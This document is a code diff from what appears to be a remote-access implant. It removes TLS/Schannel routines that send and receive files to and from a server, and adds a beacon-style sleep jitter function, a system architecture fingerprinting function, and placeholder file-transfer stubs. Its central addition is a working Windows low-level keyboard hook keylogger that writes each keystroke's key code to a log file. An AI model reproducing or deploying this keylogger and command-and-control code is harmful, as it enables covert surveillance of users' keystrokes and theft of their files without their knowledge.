-    // Convert to char buffer for sending
-    char filesize_buffer[sizeof(uint64_t)];
-    memcpy(filesize_buffer, &network_filesize, sizeof(uint64_t));
-    
-    #ifdef _WIN32
-        schannel_send(filesize_buffer, sizeof(filesize_buffer));
-    #else   
-        if (SSL_write(ssl, filesize_buffer, sizeof(filesize_buffer)) <= 0) {
-            close(file);
-            free(contents);
-            return -1;
-        }
-    #endif
-
-    // Send file content in chunks
-    ssize_t bytesRead;
-    while ((bytesRead = read(file, contents, FILE_CHUNK)) > 0) {
-        #ifdef _WIN32
-            if (schannel_send(contents, (int)bytesRead) != bytesRead) {
-                break; // Send failed
-            }
-        #else
-            if (SSL_write(ssl, contents, (int)bytesRead) <= 0) {
-                break; // Send failed
-            }
-        #endif
-    }
-    
-    close(file);
-    free(contents);
-    
-    return (bytesRead < 0) ? -1 : 0;
+int jitter() {
+    srand(time(0));
+    const int MIN_SECONDS = 0xfff;  //1 * 3600;   // 1 hours (1 * 60 * 60)
+    const int MAX_SECONDS = 0xffff;  //3 * 3600;  // 3 hours (3 * 60 * 60)
+    return MIN_SECONDS + rand() % (MAX_SECONDS - MIN_SECONDS + 1);
 }
 
-// send file to server
-int Communicate_::upload(const char *path) {
-    cJSON *file = cJSON_CreateObject();
-    if (!file) {
-        return -1;
-    }
 
-    std::filesystem::path p(path);
-    std::string filename_str = p.filename().string();
-    const char* filename = filename_str.c_str();
-
-    cJSON_AddStringToObject(file, "file_name", filename);
-    char *file_json = cJSON_Print(file);
-    cJSON_Delete(file);
-    
-    if (!file_json) {
-        return -1;
-    }
-
+const char* GetDeviceInfo::get_arch() {
     #ifdef _WIN32
-        schannel_send(file_json, (int)strlen(file_json));
+    SYSTEM_INFO sysInfo;
+    GetNativeSystemInfo(&sysInfo);
+    switch (sysInfo.wProcessorArchitecture) {
+        case PROCESSOR_ARCHITECTURE_AMD64: return "x64"; break;
+        case PROCESSOR_ARCHITECTURE_INTEL: return  "x86"; break;
+        case PROCESSOR_ARCHITECTURE_ARM64: return  "ARM64"; break;
+        default: return "unknown"; break;
+    }
     #else
-        if (SSL_write(ssl, file_json, (int)strlen(file_json)) <= 0) {
-            free(file_json);
-            return -1;
+        char *arch = (char*)malloc(0x32);
+        struct utsname buffer;
+        if (uname(&buffer) == 0) {
+            snprintf(arch, 0x32, "%s", buffer.machine);
+            return arch; 
+        } else {
+            return "Error getting architecture.\n";
         }
     #endif
-    free(file_json);
+}
 
-    // Check if file exists on server
-    char exists[BUFFER_SIZE] = {0};
-    int bytes_read;
-    
-    #ifdef _WIN32
-        bytes_read = schannel_recv(exists, sizeof(exists)-1);
-    #else
-        bytes_read = SSL_read(ssl, exists, sizeof(exists)-1);
-    #endif
-    
-    if (bytes_read <= 0) {
-        return -1;
-    }
-    exists[bytes_read] = '\0';
 
-    cJSON *file_exists = cJSON_Parse(exists);
-    if (!file_exists) {
-        return -1;
-    }
-    
-    cJSON *x = cJSON_GetObjectItem(file_exists, "Exist");
-    if (!x || !cJSON_IsBool(x)) {
-        cJSON_Delete(file_exists);
-        return -1;
-    }
-    
-    bool file_exist = cJSON_IsTrue(x);
-    cJSON_Delete(file_exists);
-    
-    if (!file_exist) {
-        return -2;
-    }
-
-    // Receive file size (network byte order)
-    char filesize_buffer[sizeof(uint64_t)];
-    
-    #ifdef _WIN32
-        if (schannel_recv(filesize_buffer, sizeof(filesize_buffer)) != sizeof(filesize_buffer)) {
-            return -1;
+#ifdef _WIN32
+LRESULT CALLBACK Keylogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    int keyCount = 0;
+    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
+        DWORD vkCode = ((KBDLLHOOKSTRUCT*)lParam)->vkCode;
+        FILE* file;
+        fopen_s(&file, keyloggerfile, "a");
+        if (file != NULL) {
+            fprintf(file, "%lu", vkCode);
+            fclose(file);
         }
-    #else   
-        if (SSL_read(ssl, filesize_buffer, sizeof(filesize_buffer)) <= 0) {
-            return -1;
+        keyCount++;
         }
-    #endif
-    
-    uint64_t network_filesize;
-    memcpy(&network_filesize, filesize_buffer, sizeof(uint64_t));
-    uint64_t filesize = ntohll(network_filesize);
-
-    // Open file for writing
-    int fd = open(path, O_WRONLY|O_CREAT|O_TRUNC, 0644);
-    if (fd == -1) {
-        return -1;
+        return CallNextHookEx(NULL, nCode, wParam, lParam);
     }
 
-    char *contents = (char*)malloc(MAX_RESPONSE);
-    if (!contents) {
-        close(fd);
-        return -1;
-    }
-
-    // Receive file content
-    size_t received = 0;
-    while (received < filesize) {
-        size_t to_read = (filesize - received) > FILE_CHUNK ? FILE_CHUNK : (filesize - received);
-        
-        #ifdef _WIN32
-            bytes_read = schannel_recv(contents, (int)to_read);
-        #else
-            bytes_read = SSL_read(ssl, contents, (int)to_read);
-        #endif
-        
-        if (bytes_read <= 0) {
-            break;
+DWORD WINAPI Keylogger::StartWindowsKeylogger(LPVOID arg) {
+        HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
+        // wait for events
+        MSG msg;
+        while (GetMessage(&msg, NULL, 0, 0) > 0) {
+            TranslateMessage(&msg);
+            DispatchMessage(&msg);
         }
-        
-        ssize_t bytes_written = write(fd, contents, bytes_read);
-        if (bytes_written != bytes_read) {
-            break;
-        }
-        
-        received += bytes_read;
+        // delete hook
+        UnhookWindowsHookEx(hook);
+        return 0;
     }
+#else 
 
-    close(fd);
-    free(contents);
-    
-    return (received == filesize) ? 0 : -1;
+#endif
+
+
+
+int Communicate::file_download(const char* path) {
+    printf("heell");   
+    return 0;
+}
+
+int Communicate::file_upload(const char* path) {
+    printf("xx");
+    return 0;
 }
